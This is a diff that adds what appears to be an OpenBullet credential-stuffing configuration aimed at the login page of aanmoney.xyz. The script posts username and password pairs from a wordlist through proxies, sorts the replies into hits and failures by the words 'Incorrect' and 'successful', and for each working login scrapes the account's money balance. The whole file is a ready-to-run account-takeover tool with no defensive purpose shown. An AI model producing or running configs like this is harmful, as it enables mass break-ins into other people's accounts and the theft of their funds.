@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "aanmoney.xyz",
+  "SuggestedBots": 112,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-23T22:27:37.6318359+03:00",
+  "AdditionalInfo": "",
+  "Author": "cypher",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://aanmoney.xyz/dologin.php?rstr=0.6352681592650968" ParseQuery=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: BluTV/2 CFNetwork/974.2.1 Darwin/18.0.0" 
+  HEADER "Authorization: Bearer (null)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect" 
+  KEYCHAIN Success OR 
+    KEY "successful" 
+
+REQUEST GET "https://aanmoney.xyz/index.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<td><h2><div id=\"moneycount\">" "&" -> CAP "Kasanızdaki Para=" 
+
